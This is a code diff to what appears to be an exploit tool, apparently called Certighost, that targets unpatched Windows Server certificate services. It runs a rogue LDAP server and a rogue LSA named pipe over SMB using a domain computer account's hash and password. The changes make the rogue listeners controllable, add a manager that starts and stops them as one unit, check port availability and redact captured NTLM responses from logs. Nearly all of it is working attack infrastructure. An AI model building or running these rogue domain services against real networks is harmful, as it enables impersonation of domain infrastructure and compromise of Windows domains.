@@ -8,12 +8,14 @@ cumulative updates.
 
 import calendar
 import os
+import re
 import socket
 import struct
 import threading
 import time
 from binascii import unhexlify
-from typing import Any, Dict, List, Optional, Tuple, Union, cast
+from queue import Empty, Queue
+from typing import Any, Callable, Dict, List, Optional, Tuple, Union, cast
 
 from Cryptodome.Cipher import ARC4
 from impacket import ntlm, smbserver, uuid
@@ -31,6 +33,17 @@ CERTIGHOST_FIXED_BUILDS = {
     20348: 5386,  # Windows Server 2022
     26100: 33158,  # Windows Server 2025
 }
+
+
+def redacting_smb_logger(original_log: Callable[..., None]) -> Callable[..., None]:
+    """Wrap Impacket's SMB logger while preserving its version-specific API."""
+
+    def safe_log(msg: str, level: int = 20, *args: Any, **kwargs: Any) -> None:
+        if re.match(r"^[^:]+::[^:]+:[0-9a-fA-F]+:", msg):
+            msg = "NTLM authentication response redacted"
+        original_log(msg, level, *args, **kwargs)
+
+    return safe_log
 
 
 def parse_windows_build(build: str) -> Optional[Tuple[int, int]]:
@@ -84,6 +97,22 @@ def detect_listener_ip(remote_ip: str) -> Optional[str]:
         return None
     finally:
         sock.close()
+
+
+def check_listener_ports_available(
+    bind_address: str = "0.0.0.0", ports: Tuple[int, ...] = (389, 445)
+) -> List[int]:
+    """Return listener ports that cannot currently be bound."""
+    unavailable = []
+    for port in ports:
+        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            probe.bind((bind_address, port))
+        except OSError:
+            unavailable.append(port)
+        finally:
+            probe.close()
+    return unavailable
 
 
 def _ber_length(length: int) -> bytes:
@@ -349,6 +378,9 @@ class RogueLDAP:
         self.host_netbios = computer_name.rstrip("$")
         self.host_dns = f"{self.host_netbios}.{self.domain}"
 
+        self._server: Optional[socket.socket] = None
+        self._stop_event = threading.Event()
+
     def _root_dse(self) -> Dict[str, List[Union[str, bytes]]]:
         configuration_dn = f"CN=Configuration,{self.base_dn}"
         return {
@@ -554,16 +586,43 @@ class RogueLDAP:
         finally:
             connection.close()
 
-    def serve(self, bind_address: str = "0.0.0.0", port: int = 389) -> None:
+    def serve(
+        self,
+        ready_event: Optional[threading.Event] = None,
+        bind_address: str = "0.0.0.0",
+        port: int = 389,
+    ) -> None:
+        self._stop_event.clear()
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((bind_address, port))
         server.listen(8)
-        while True:
-            connection, _ = server.accept()
-            threading.Thread(
-                target=self._client, args=(connection,), daemon=True
-            ).start()
+        server.settimeout(0.5)
+        self._server = server
+        if ready_event is not None:
+            ready_event.set()
+        try:
+            while not self._stop_event.is_set():
+                try:
+                    connection, _ = server.accept()
+                except socket.timeout:
+                    continue
+                except OSError:
+                    if self._stop_event.is_set():
+                        break
+                    raise
+                threading.Thread(
+                    target=self._client, args=(connection,), daemon=True
+                ).start()
+        finally:
+            server.close()
+            self._server = None
+
+    def stop(self) -> None:
+        """Stop accepting LDAP connections and release the listener socket."""
+        self._stop_event.set()
+        if self._server is not None:
+            self._server.close()
 
 
 class RogueLSA(DCERPCServer):
@@ -708,55 +767,165 @@ def _patch_simple_smb_server() -> None:
         untyped_server_type.getServer = lambda server: server._SimpleSMBServer__server
 
 
-def serve_lsa_over_smb(
-    bind_address: str,
-    domain: str,
-    domain_guid: bytes,
-    domain_sid: str,
-    computer_name: str,
-    computer_hash: str,
-    computer_password: str,
-    dc_ip: str,
-    port: int = 445,
-) -> None:
-    """Serve the LSA named pipe required by the CA chase."""
-    _patch_simple_smb_server()
-    server = smbserver.SimpleSMBServer(listenAddress=bind_address, listenPort=port)
-    server.setSMB2Support(True)
-    server.setLogFile("")
-    server.setComputerAccount(
-        computer_account_name=computer_name,
-        computer_account_hash=computer_hash,
-        computer_account_aes="",
-        computer_account_password=computer_password,
-        computer_account_domain=domain,
-        dcip=dc_ip,
-    )
-    untyped_server = cast(Any, server)
-    config = untyped_server._SimpleSMBServer__smbConfig
-    config.set("global", "server_os", "Windows Server 2022 Standard")
-    server.getServer().setServerConfig(config)
-    server.getServer().processConfigFile()
-    lsa = RogueLSA(domain.split(".")[0].upper(), domain, domain_guid, domain_sid)
-    lsa.daemon = True
-    lsa.start()
-    server.registerNamedPipe("lsarpc", ("127.0.0.1", lsa.getListenPort()))
-    server.start()
+class SMBLSAListener:
+    """Controllable SMB listener exposing the rogue LSA named pipe."""
 
+    def __init__(
+        self,
+        bind_address: str,
+        domain: str,
+        domain_guid: bytes,
+        domain_sid: str,
+        computer_name: str,
+        computer_hash: str,
+        computer_password: str,
+        dc_ip: str,
+        port: int = 445,
+    ) -> None:
+        self.bind_address = bind_address
+        self.domain = domain
+        self.domain_guid = domain_guid
+        self.domain_sid = domain_sid
+        self.computer_name = computer_name
+        self.computer_hash = computer_hash
+        self.computer_password = computer_password
+        self.dc_ip = dc_ip
+        self.port = port
+        self._server: Optional[Any] = None
+        self._lsa: Optional[RogueLSA] = None
 
-def wait_for_listeners(timeout: int = 15) -> bool:
-    """Wait until the local LDAP and SMB listeners are accepting connections."""
-    deadline = time.monotonic() + timeout
-    while time.monotonic() < deadline:
-        ready = True
-        for port in (389, 445):
+    def serve(self, ready_event: Optional[threading.Event] = None) -> None:
+        _patch_simple_smb_server()
+        server = smbserver.SimpleSMBServer(
+            listenAddress=self.bind_address, listenPort=self.port
+        )
+        server.setSMB2Support(True)
+        server.setLogFile("")
+        server.setComputerAccount(
+            computer_account_name=self.computer_name,
+            computer_account_hash=self.computer_hash,
+            computer_account_aes="",
+            computer_account_password=self.computer_password,
+            computer_account_domain=self.domain,
+            dcip=self.dc_ip,
+        )
+        untyped_server = cast(Any, server)
+        config = untyped_server._SimpleSMBServer__smbConfig
+        config.set("global", "server_os", "Windows Server 2022 Standard")
+        server.getServer().setServerConfig(config)
+        server.getServer().processConfigFile()
+        underlying_server = server.getServer()
+        underlying_server.log = cast(Any, redacting_smb_logger(underlying_server.log))
+        lsa = RogueLSA(
+            self.domain.split(".")[0].upper(),
+            self.domain,
+            self.domain_guid,
+            self.domain_sid,
+        )
+        lsa.daemon = True
+        lsa.start()
+        server.registerNamedPipe("lsarpc", ("127.0.0.1", lsa.getListenPort()))
+        self._lsa = lsa
+        self._server = server
+        if ready_event is not None:
+            ready_event.set()
+        try:
+            server.start()
+        finally:
+            self._server = None
+
+    def stop(self) -> None:
+        """Stop SMB and release both external and internal listener sockets."""
+        server = self._server
+        if server is not None:
+            underlying = server.getServer()
             try:
-                connection = socket.create_connection(("127.0.0.1", port), 1)
-                connection.close()
-            except OSError:
-                ready = False
-                break
-        if ready:
-            return True
-        time.sleep(0.25)
-    return False
+                underlying.shutdown()
+            finally:
+                server.stop()
+        lsa = self._lsa
+        if lsa is not None:
+            client_socket = getattr(lsa, "_clientSock", None)
+            listen_socket = getattr(lsa, "_sock", None)
+            for active_socket in (client_socket, listen_socket):
+                if active_socket is not None:
+                    try:
+                        active_socket.close()
+                    except OSError:
+                        pass
+            self._lsa = None
+
+
+class CertighostListenerManager:
+    """Start, monitor, and stop both callback listeners as one unit."""
+
+    def __init__(self, ldap: RogueLDAP, smb: SMBLSAListener) -> None:
+        self.ldap = ldap
+        self.smb = smb
+        self._errors: Queue[Tuple[str, BaseException]] = Queue()
+        self._threads: List[threading.Thread] = []
+        self._stopping = threading.Event()
+
+    def _run(
+        self,
+        name: str,
+        serve: Callable[[Optional[threading.Event]], None],
+        ready_event: threading.Event,
+    ) -> None:
+        try:
+            serve(ready_event)
+            if not self._stopping.is_set():
+                self._errors.put((name, RuntimeError("listener stopped unexpectedly")))
+        except BaseException as exc:
+            if not self._stopping.is_set():
+                self._errors.put((name, exc))
+
+    def raise_if_failed(self) -> None:
+        """Raise the first background listener failure, if any."""
+        try:
+            name, error = self._errors.get_nowait()
+        except Empty:
+            return
+        raise RuntimeError(f"{name} listener failed: {error}") from error
+
+    def start(self, timeout: float = 15) -> None:
+        """Start both listeners and wait until each has bound successfully."""
+        ready_events = {
+            "LDAP": threading.Event(),
+            "SMB/LSA": threading.Event(),
+        }
+        listeners = {
+            "LDAP": self.ldap.serve,
+            "SMB/LSA": self.smb.serve,
+        }
+        self._stopping.clear()
+        for name, serve in listeners.items():
+            thread = threading.Thread(
+                target=self._run,
+                args=(name, serve, ready_events[name]),
+                daemon=True,
+                name=f"certighost-{name.lower()}",
+            )
+            self._threads.append(thread)
+            thread.start()
+
+        deadline = time.monotonic() + timeout
+        try:
+            while time.monotonic() < deadline:
+                self.raise_if_failed()
+                if all(event.is_set() for event in ready_events.values()):
+                    return
+                time.sleep(0.05)
+            raise RuntimeError("Timed out waiting for Certighost listeners")
+        except BaseException:
+            self.stop()
+            raise
+
+    def stop(self) -> None:
+        """Stop both listeners and wait briefly for their threads to exit."""
+        self._stopping.set()
+        self.ldap.stop()
+        self.smb.stop()
+        for thread in self._threads:
+            thread.join(timeout=2)
+        self._threads.clear()
